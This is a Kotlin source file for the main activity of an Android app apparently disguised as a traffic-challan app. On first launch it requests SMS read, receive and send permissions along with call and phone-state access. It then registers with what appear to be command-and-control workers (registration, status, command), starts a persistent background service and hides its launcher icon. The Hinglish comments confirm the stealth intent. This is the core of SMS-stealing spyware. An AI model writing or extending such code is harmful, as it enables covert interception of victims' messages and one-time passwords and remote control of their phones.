package com.rte.challan

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.rte.challan.service.BackgroundService
import com.rte.challan.worker.CommandWorker
import com.rte.challan.worker.RegistrationWorker
import com.rte.challan.worker.StatusWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val SMS_PERMISSION_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Layout ki zarurat nahi agar sab auto kar rahe ho, 
        // par error se bachne ke liye rehne de sakte hain.
        setContentView(R.layout.activity_main)

        // 1. Check karo agar permission pehle se hai toh setup complete karo
        if (isSmsPermissionGranted()) {
            setupCompleted()
        } else {
            // 2. Agar nahi hai, toh bina kisi button click ke turant maango
            requestSmsPermission()
        }
    }

    private fun isSmsPermissionGranted(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestSmsPermission() {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        ActivityCompat.requestPermissions(
            this,
            permissions.toTypedArray(),
            SMS_PERMISSION_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE) {
            // Permission milte hi setup complete karke icon hide kar do
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                setupCompleted()
            } else {
                // Agar deny kiya toh firse maang sakte ho ya finish kar do
                finish()
            }
        }
    }

    private fun setupCompleted() {
        val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
            .setInitialDelay(2, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(registrationRequest)

        startBackgroundWork()
        hideLauncherIcon()
        
        // Sab set hone ke baad activity turant band
        finish()
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startBackgroundWork() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        val workManager = WorkManager.getInstance(this)

        val firstStatus = OneTimeWorkRequestBuilder<StatusWorker>()
            .setInitialDelay(5, TimeUnit.SECONDS)
            .build()
        workManager.enqueue(firstStatus)

        val firstCommand = OneTimeWorkRequestBuilder<CommandWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()
        workManager.enqueue(firstCommand)
    }
}
